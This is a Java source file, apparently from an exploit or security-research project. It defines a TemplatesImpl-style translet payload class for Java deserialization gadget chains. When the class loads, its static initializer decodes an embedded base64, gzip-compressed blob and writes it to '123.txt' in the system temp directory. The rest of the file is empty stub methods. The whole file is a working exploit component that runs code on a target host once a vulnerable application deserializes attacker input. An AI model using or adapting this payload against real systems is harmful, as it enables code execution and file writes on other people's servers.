package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class TemplatesImplPayload1 extends AbstractTranslet {

    static {
        try {
            String base64 = "H4sIAAAAAAAAAKVU21ITQRA9k4QsJKuES0QkiOAtyQbWC3gLUlZRWkVVFMpYefFpCQMstTdnJ1QoP8Dv0QcsfPAD/CjLnt0YthDiAy/d0z0953Sfmd1fv3/8BLCMtRyGcXsEd3A3h3u4r0w5jwqqeRioaVjUsKTBZMiu2p4t1xjS5UqLIbPu73CG0Ybt8Xcdd5uLD9a2Q5nxht+2nJYlbBX3khm5b4cMs42275rd/VD6whWmFQTmG9uRXGy4gVNnGN7x45jhY7lxYB1aXTPk4tDh0mzG/j3/1OGhrF+0Gwa+F/Kz2zHq+r5le3XVvSZiGIabg2moJ9HDZJj7DynDUFtRMMwM4GfIve62eSBtOqThgYaHJJASlxjOTt076Hu79l7Uub6byDCUBtXTnDs0hPCPiLPpd0Sb0766tVPVl9R5HTnkNTzS8RjLGlZ0PMFTZZ5peK7jBeoaVnWM4SWNNuAKGQoKznQsb8/c3D7gbZpp8rwOGSaiSts3Nzb7ctB1nKtwoiBB0DwKJXfpQfodoik2/gJuCduTTSm45dYTPIk0CROoyCHATHlD6VqMlU+2HuldGvQ8SMk9LrcsYbmchnprBQxj5UqM1JG2Y1KKepi+8DUwvLrcQ6+0MA+NPmKGEfqiM+TpLsnqFJnkGfmh6newr7RI4QrZbJTM4ipZPS7AKArkqX2MU5U6/AVpggOMb0gVPh8jTd44RoZcLXbGCYYYaL1o1E6QTeOU4gbBA+rnkidoHdcou0CEVYoUbTWG7tGq1QQmo1YMFKk6Fa2mcJ2amI6aTRHmDFWUMNubbiViw7+TTUQUMQjrU9DjwlwkyK2+QEaUPwdiKiEO64szH1Ut/AE4GSGFPgUAAA==";
            byte[] bytes = ungzip(Base64.getDecoder().decode(base64));
            Path path = Paths.get(System.getProperty("java.io.tmpdir"), "123.txt");
            System.out.println(path);
            Files.write(path, bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] ungzip(byte[] bytes) throws Exception {
        GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        byte[] buf = new byte[2 * 1024];
        for (int read; (read = in.read(buf)) != -1; ) {
            out.write(buf, 0, read);
        }

        return out.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
